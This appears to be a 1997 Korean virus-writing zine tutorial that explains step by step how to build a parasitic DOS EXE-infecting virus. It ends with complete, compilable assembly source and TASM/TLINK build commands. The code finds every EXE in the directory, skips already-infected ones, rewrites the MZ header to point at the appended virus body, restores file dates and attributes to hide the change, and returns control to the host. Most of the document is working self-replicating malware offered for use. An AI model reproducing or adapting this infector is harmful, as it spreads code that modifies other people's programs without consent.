
 EXE 기생형의 생성 과정                                          CVC #01  97/06

----------------------------------------------------------------> Hong_gil_dong

  ┏━━━━━━━━━━━━━━┓
  ┃  실행에 주의를 요합니다    ┃
  ┗━━━━━━━━━━━━━━┛

  1. 델타 옵셋을 계산한다.
  2. 헤더를 보관한다 (메모리에서)
  3. DTA를 보관한다.
  4. EXE 파일를 찾고 없으면 17로 이동한다.
  5. 시간 날짜 속성을 보관한다.
  6. 파일속성을 청소한다.
  7. 파일을 읽고/쓰기위해 연다.
  8. 헤더를 읽는다.
  9. 파일의 감염여부를 판단한다
      a)감염 되었으면 16으로 이동한다
      b)아니면 다음으로 진행한다
 10. 헤더의 중요한 부분을 보관한다.
 11. 헤더의 값을 변경한다
 12. 바이러스를 파일에 복사한다.
 13. 세로운 헤더를 파일에 쓴다
 14. 시간과 날짜를 보관한다
 15. 파일을 닫는다.
 16. 속성을 복구한다.
 17. DTA 복구한다
 18. 제어를 원래 프로그램으로 옮긴다 (메모리에서)

 다음 위의 순서도를 차례대로 설명한 것입니다

  1. 별로 새로운것이 없다
    to vstart.

        vstart: call doit
        doit:   pop  bp                   ;델타옵셋을 계산
                sub  bp,OFFSET doit       ;한다

  2. DS, ES 를 저장하고 헤더를 보관한다

        push ds
        push es
        push cs
        pop  ds
        push cs
        pop  es
        lea  si,[bp+OFFSET orgCSIP2]
        lea  di,[bp+OFFSET orgCSIP]
        movsw
        movsw
        movsw
        movsw

  3.새로운것이 없다

        lea  dx,[bp+OFFSET dta]           ;dta 를 저장한다
        mov  ah,1ah
        int  21h

     dta를 다음과 같이 저장한다
        dta db 42 dup (?)

  4.새로운 것이 없다

        mov  ah,4eh                       ;첫번째 희생 파일을 찾는다.
        lea  dx,[bp+exe_files]            ; DX = 찾는 파일
        mov  cx,7                         ; CX = 파일 속성
        int  21h

    exe_files 은 다음과같이 정의한다
     exe_files: db "*.exe",0

  5.새로운것이 없다

        lea  si,[bp+OFFSET dta+21]        ; 파일속성과
        mov  cx,5                         ; 날짜와 시간
        lea  di,[bp+OFFSET attributes]    ; 을 저장한다
        rep  movsb

  6.앞에서 다루었던 것이다

        mov  ax,4301h                     ; 파일속성을
        xor  cx,cx                        ; 정리한다
        lea  dx,[bp+dta+30]
        int  21h

  7.새로운것이 없다.

        mov  ax,3d02h                     ; 파일을 읽고
        lea  dx,[bp+OFFSET dta+30]        ; 쓰기위해 연다
        int  21h

  8.헤더을 읽어와 버퍼에 저장한다.파일감염 여부와 원래 프로그램으로
    제어를 넘기기전에 헤더 복구를 위해 사용한다

        xchg ax,bx              ; 화일핸들을 bx 에 복사한다
        mov  ah,3fh             ; 화일로 부터 1ah 바이트를
        lea  dx,[bp+buffer]     ; 읽어온다
        mov  cx,1ah
        int  21h

  9.옵샛 10h의 내용를 읽어와 감염여부를 판별한다

        cmp  byte ptr [bp+buffer+10h],ID  ; 파일이 감염됐는가?
        jz   another                      ; 맞으면 다음 희생자를 찾는다.

 10. cx 값(1ah=헤더의 길이) 를 저장해둔다.  또한 bx값(화일핸들)
     도 저장해둔다 이렇게 함으로서 다음에 이어지는 명령에 의해
     원래의 값이 파괴되지 않는다
     이부분에서 가장중요한것은 헤더에 있는 모든내용를 저장해두는
    것이다 나중에 복구를 위해 필요하다

        mov  cx,1ah
        push cx
        push bx                           ;파일핸들 저장.
        les  ax,dword ptr [bp+buffer+14h] ;<헤더의 중요한
        mov  word ptr [bp+orgCSIP2],ax    ; 부분을 저장해
        mov  word ptr [bp+orgCSIP2+2],es  ; 둔다>
        les  ax,dword ptr [bp+buffer+0eh]
        mov  word ptr [bp+orgSSSP2],es
        mov  word ptr [bp+orgSSSP2+2],ax


   11.헤더를 새로운 값으로 변경한다.

        mov  ax,word ptr [bp+buffer+8]    ;헤더크기를
        mov  cl,4                         ; 얻어서 바이트
        shl  ax,cl                        ; 크기로 바꾼다
        xchg ax,bx                        ;
        les  ax,dword ptr [bp+dta+1ah]    ; 파일크기를
        mov  dx,es                        ; 보관해둔다
        push ax
        push dx
        sub  ax,bx                        ; 파일크기에서 헤더
        sbb  dx,0                         ; 크기를빼서 세그먼트
        mov  cx,10h                       ; 와  옵셋형태로
        div  cx                           ; 바꾼다
        mov  word ptr [bp+buffer+14h],dx  ;cs 세로운 옵셋
        mov  word ptr [bp+buffer+16h],ax  ;cs 세로운 세그먼트
        mov  word ptr [bp+buffer+0eh],ax  ;ss 세로운 세그먼트
        mov  word ptr [bp+buffer+10h],ID  ;감염식별자
        pop  dx                           ; 파일길이를
        pop  ax                           ; 얻는다
        pop  bx                           ;파일핸들 복구.
        add  ax,vend-vstart               ;<파일크기에 바이러스
        adc  dx,0                         ; 길이를 더한다>
        mov  cl,9                         ;페이지 길이=512=2^9.
        push ax                           ;<파일를 페이지
        shr  ax,cl                        ; 단위로 계산한다>
        ror  dx,cl
        stc
        adc  dx,ax
        pop  ax
        and  ah,1
        mov  word ptr [bp+buffer+4],dx    ;새로운 페이지수
        mov  word ptr [bp+buffer+2],ax    ;페이지 나머지
        push cs
        pop  es

 12.파일에 바이러스를 써넣는다

        mov  ah,40h
        lea  dx,[bp+OFFSET vstart]
        mov  cx,vend-vstart
        int  21h
 13.세로운 헤더를 파일에 쓴다:

        mov  ax,4200h                     ;<파일 시작
        xor  cx,cx                        ; 지점으로
        cwd                               ; 이동한다>
        int  21h
        mov  ah,40h                       ;<파일에
        lea  dx,[bp+OFFSET buffer]        ; 세로운
        pop  cx                           ; 헤더를
        int  21h                          ; 쓴다.>

 14.앞에서 언급한 내용입니다

        mov  ax,5701h              ;<원래의
        mov  dx,word ptr [bp+date] ; 시간과
        mov  cx,word ptr [bp+time] ; 날짜를
        int  21h                   ; 복구한다.>

 15.파일를 닫읍니다...

        mov  ah,3eh                ;<파일을
        int  21h                   ; 닫는다>

 16.파일속성을 복구합니다

        mov  ax,4301h               ;<파일
        lea  dx,[bp+OFFSET dta+30]  ; 속성를
        xor  ch,ch                  ; 복구시
        mov  cl,byte ptr [bp+attributes]  ; 킨다>
        int  21h

 17.dta를 복구합니다

        mov  dx,80h           ; DTA를
        mov  ah,1ah           ; 복구한다
        int  21h

 18.제어를 원래파일로 옮긴다 (메모리에서!!):

        pop  es               ;es 복구
        pop  ds               ;ds 복구
        mov  ax,es            ;ax<-PSP segment.
        add  ax,10h
        add  word ptr cs:[bp+orgCSIP+2],ax
        add  ax,word ptr cs:[bp+orgSSSP+2]
        cli                  ;스택의 변화를 막기위함
        mov  sp,word ptr cs:[bp+orgSSSP]  ; sp 조정
        mov  ss,ax                        ; ss 조정
        sti
        db   0eah   ;원래 프로그램으로 제어를 넘깁니다

    아래의 사항도 필요합니다;

        orgCSIP dd ?               ;원래의 CS:IP.
        orgSSSP dd ?              ;원래의 SS:SP.
        orgCSIP2 dd 0fff00000h
        orgSSSP2 dd ?

다음은 위의내용를 이용한 소스입니다

-<EXAMPLE1.ASM>-----------------------------------
;현재 디렉토리에 있는 모든 exe 파일을 감염시킨다
;컴파일 명령:
; TASM /m EXAMPLE1.ASM
; TLINK /t EXAMPLE1.ASM
.model tiny
.code
        org 100h
ID = 'SW'                           ;감염 식별자
vstart: call doit
doit:   pop  bp                     ;<델타 옵셋을
        sub  bp,OFFSET doit         ; 계산합니다.>
        push ds
        push es
        push cs
        pop  ds
        push cs
        pop  es
        lea  si,[bp+OFFSET orgCSIP2]
        lea  di,[bp+OFFSET orgCSIP]
        movsw
        movsw
        movsw
        movsw
        lea  dx,[bp+OFFSET dta]     ;<dta를 설정
        mov  ah,1ah                 ; 합니다>
        int  21h
first:  mov  ah,4eh
        lea  dx,[bp+exe_files]      ;<.EXE 파일을 찾읍니다
        mov  cx,7                   ; 속성은 무작위.>
next:   int  21h
        jnb  got_it
        jmp  quit                   ;EXE 파일이 없으면 종료
got_it: lea  si,[bp+OFFSET dta+21]  ;<파일 속성 날짜
        mov  cx,5                   ; 시간을 저장합니다>
        lea  di,[bp+OFFSET attributes]
        rep  movsb
        mov  ax,4301h               ; <파일 속성를
        xor  cx,cx                  ; 바꿉니다>
        lea  dx,[bp+dta+1eh]
        int  21h

        mov  ax,3d02h               ; <읽고 쓰기위해
        lea  dx,[bp+OFFSET dta+1eh] ; 파일를 엽니다>
        int  21h
        xchg ax,bx                  ; 파일핸들을 ax 로 복사
        mov  ah,3fh                 ; <1ah 바이트를 읽어와
        lea  dx,[bp+OFFSET buffer]  ; 버퍼에 저장합니다>
        mov  cx,1ah
        int  21h
        mov  ax,4202h               ;<파일끝으로
        xor  cx,cx                  ; 이동합니다>
        cwd
        int  21h
        cmp  word ptr [bp+buffer+10h],ID  ;감염된파일 인가?
        jnz  infect                       ;아니면 감염 .
        jmp  another                     ;맞으면 다른파일 감염
   infect: mov  cx,1ah
        push cx
        push bx                           ;파일핸들을 저장
        les  ax,dword ptr [bp+buffer+14h] ;<헤더 부분을
        mov  word ptr [bp+orgCSIP2],ax    ; 저장합니다>
        mov  word ptr [bp+orgCSIP2+2],es
        les  ax,dword ptr [bp+buffer+0eh]
        mov  word ptr [bp+orgSSSP2],es
        mov  word ptr [bp+orgSSSP2+2],ax
        mov  ax,word ptr [bp+buffer+8]    ;<헤더의
        mov  cl,4                         ; 길이를 얻는서
        shl  ax,cl                        ; 바이트 크기로
        xchg ax,bx                        ; 변한한다.>
        les  ax,dword ptr [bp+dta+1ah]    ;<파일의 크기를
        mov  dx,es                        ; 저장한다>
        push ax
        push dx
        sub  ax,bx                        ;<파일크기에서
        sbb  dx,0                         ; 헤더크기를 빼서
        mov  cx,10h                       ; 세그먼트 옵셋
        div  cx                           ; 형태로 바꾼다>
        mov  word ptr [bp+buffer+14h],dx  ;세로운 시작지점
        mov  word ptr [bp+buffer+16h],ax  ;cs의 세로운 주소
        mov  word ptr [bp+buffer+0eh],ax  ;ss의 세로운 주소
        mov  word ptr [bp+buffer+10h],ID  ;감염 식별자
        pop  dx                           ;<파일길이를
        pop  ax                           ; 얻는다.>
        pop  bx                           ;파일핸들를 복구
        add  ax,vend-vstart               ;<파일크기에 바이러스
        adc  dx,0                         ; 크기를 더한다>
        mov  cl,9                         ;페이지 길이=512=2^9.
        push ax                           ;<페이지 단위로
        shr  ax,cl                        ; 계산하다>
        ror  dx,cl
        stc
        adc  dx,ax
        pop  ax
        and  ah,1
        mov  word ptr [bp+buffer+4],dx    ;세로운 페이지 길이
        mov  word ptr [bp+buffer+2],ax    ;페이지 나머지
        push cs
        pop  es
        mov  ah,40h                       ;<바리러슬
        lea  dx,[bp+OFFSET vstart]        ; 파일에 붙여
        mov  cx,vend-vstart               ; 쓴다>
        int  21h
        mov  ax,4200h                     ;<파일 시작점
        xor  cx,cx                        ; 으로 이동>
        cwd
        int  21h
        mov  ah,40h                       ;<파일에 세로운
        lea  dx,[bp+OFFSET buffer]        ; 헤더를 만든다>
        pop  cx
        int  21h
        mov  ax,5701h                     ;<원래의 시간과
        mov  dx,word ptr [bp+date]        ; 날짜를 복구한다>
        mov  cx,word ptr [bp+time]
        int  21h
        mov  ah,3eh                       ;<파일를 닫는다>
        int  21h

another:mov  ax,4301h                     ;<파일의 원래 속성
        lea  dx,[bp+OFFSET dta+1eh]       ; 를 복구한다>
        xor  ch,ch
        mov  cl,byte ptr [bp+attributes]
        int  21h
        mov  ah,4fh                       ;다른 제물를 찾는다
        jmp  next
quit:   mov  dx,80h                       ; DTA.를 복구한다
        mov  ah,1ah
        int  21h
        pop  es                           ; es.복구
        pop  ds                           ; ds.복구
        mov  ax,es                        ;ax<-PSP segment.
        add  ax,10h                       ;psp를 건너뛴다
        add  word ptr cs:[bp+orgCSIP+2],ax
        add  ax,word ptr cs:[bp+orgSSSP+2]
        cli
        mov  sp,word ptr cs:[bp+orgSSSP]  ; sp 를 저장한다
        mov  ss,ax                        ; ss.를 저장한다
        sti
        db   0eah                         ;제어를 원래 프로그램으로
orgCSIP dd ?                              ;원래의 CS:IP.
orgSSSP dd ?                              ;원래의 SS:SP.
orgCSIP2 dd 0fff00000h                    ;파일 중계를 위함
orgSSSP2 dd ?

exe_files db '*.exe',0

vend equ $
attributes db ?                           ; 속성보관.
time dw ?                                 ; 시간 보관
date dw ?                                 ; 날짜 보관.
dta db 42 dup (?)                         ; DTA. 보관
buffer db 1ah dup (?)                     ; 헤더 보관
end vstart
----------------기생형 exe  완전 끝 ---------------------


